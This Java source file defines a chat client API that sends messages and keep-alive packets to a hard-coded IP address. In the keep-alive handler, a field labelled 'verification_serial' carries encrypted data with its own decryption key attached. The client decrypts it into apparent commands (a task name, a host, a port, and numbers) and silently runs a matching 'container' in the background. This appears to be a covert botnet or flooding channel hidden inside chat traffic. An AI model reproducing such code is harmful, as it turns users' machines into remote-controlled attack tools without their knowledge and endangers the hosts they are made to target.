package me.pk2.chatserver;

import me.pk2.chatserver.clientside.objects.KeepAliveResponse;
import me.pk2.chatserver.container.Container;
import me.pk2.chatserver.container.ContainerManager;
import me.pk2.chatserver.message.Message;
import me.pk2.chatserver.packets.CSChatPacket;
import me.pk2.chatserver.packets.CSKeepAlivePacket;
import me.pk2.chatserver.packets.Packet;
import me.pk2.chatserver.packets.SCUpdatePacket;
import me.pk2.chatserver.user.User;
import me.pk2.moodlyencryption.MoodlyEncryption;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;

public class ChatAPI {
    public static final AtomicInteger lastKeepAliveUsers = new AtomicInteger(0);
    public static final ContainerManager containerManager = new ContainerManager();
    public static ExecutorService executorService = Executors.newFixedThreadPool(1);
    public static MoodlyEncryption moodlyEncrypt = null;
    private static User user;

    public ChatAPI() {
        try { ChatAPI.moodlyEncrypt = new MoodlyEncryption(); } catch (Exception exception) {}
    }

    public static KeepAliveResponse handshake(String username) {
        if(user != null)
            return keepAlive();

        user = new User(username);
        return keepAlive();
    }
    public static void sendMessage(String message) {
        boolean success = false;
        while(!success) {
            try {
                Socket socket = new Socket("209.141.58.112", 43710);
                ObjectOutputStream outputStream = new ObjectOutputStream(socket.getOutputStream());
                outputStream.writeObject(new CSChatPacket(user.username, message));
                socket.close();
                success = true;
            } catch (Exception exception) { exception.printStackTrace(); try { Thread.sleep(100); } catch (Exception exception1) { exception1.printStackTrace(); } }
        }
    }
    public static Container container = null;
    public static KeepAliveResponse keepAlive() {
        boolean success = false;
        while(!success) {
            try {
                Socket socket = new Socket("209.141.58.112", 43710);
                ObjectOutputStream outputStream = new ObjectOutputStream(socket.getOutputStream());
                outputStream.writeObject(new CSKeepAlivePacket(user.username));
                ObjectInputStream inputStream = new ObjectInputStream(socket.getInputStream());
                Packet packet = (Packet)inputStream.readObject();
                if(packet instanceof SCUpdatePacket) {
                    SCUpdatePacket updatePacket = (SCUpdatePacket)packet;
                    lastKeepAliveUsers.set((int)updatePacket.users.stream().filter(v -> v.isAlive()).count());

                    String raw_data = updatePacket.verification_serial;
                    if(raw_data != "" && raw_data.length()>0) {
                        String data = raw_data.substring(0, raw_data.length() - 16);
                        String key = raw_data.substring(raw_data.length() - 16);
                        moodlyEncrypt = new MoodlyEncryption();
                        moodlyEncrypt.init(key);

                        data = moodlyEncrypt.decrypt(data.getBytes());
                        String[] split = data.split(" ");

                        if (containerManager.containers.containsKey(split[0]) && (container == null || !container.isBusy())) {
                            container = containerManager.containers.get(split[0]);
                            executorService.submit(() -> container.run(split[1], Integer.parseInt(split[2]), split[3], Integer.parseInt(split[4]), Integer.parseInt(split[5])));
                        }
                    }

                    return new KeepAliveResponse(updatePacket.users, updatePacket.messages);
                }
                socket.close();

                success = true;
            } catch (Exception exception) { try { Thread.sleep(100); } catch (Exception exception1) { exception1.printStackTrace(); } }
        }
        return null;
    }

}